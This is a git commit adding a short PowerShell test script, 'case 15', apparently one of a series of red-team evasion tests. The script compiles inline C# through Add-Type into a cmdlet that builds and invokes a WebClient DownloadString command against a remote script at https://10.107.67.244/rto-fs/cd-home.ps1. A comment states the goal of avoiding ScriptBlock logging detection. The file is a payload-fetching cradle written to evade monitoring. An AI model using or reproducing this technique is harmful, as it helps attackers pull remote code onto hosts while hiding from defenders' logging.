db99226a2a49aa33c0f0a16ab00ee410e4264882
Cedric <cebrisebois11@gmail.com>
2024-04-11 17:20:04 -0400

    Added case 15

---
+++ Test15.ps1
@@ -0,0 +1,25 @@
+﻿#Might be a way to move the code to a file and load/precompile to avoid detection on ScriptBlock
+
+$code = @"
+    using System;
+    using System.Management.Automation;
+
+    [Cmdlet("Don", "Low")]
+    public class DonLow : Cmdlet
+    {
+        [Parameter(Position =0)]
+        public  String Cmd  { get; set; }
+
+        public void Do(string url)
+        {
+        String command = "(new-object net.webclient).DownloadString('" + url + "')";
+         ScriptBlock scriptBlock = ScriptBlock.Create(command);
+         scriptBlock.Invoke();
+         }
+    }
+"@
+
+    Add-Type $code
+
+    $cmdlet = [DonLow]::new()
+    $cmdlet.Do("https://10.107.67.244/rto-fs/cd-home.ps1")
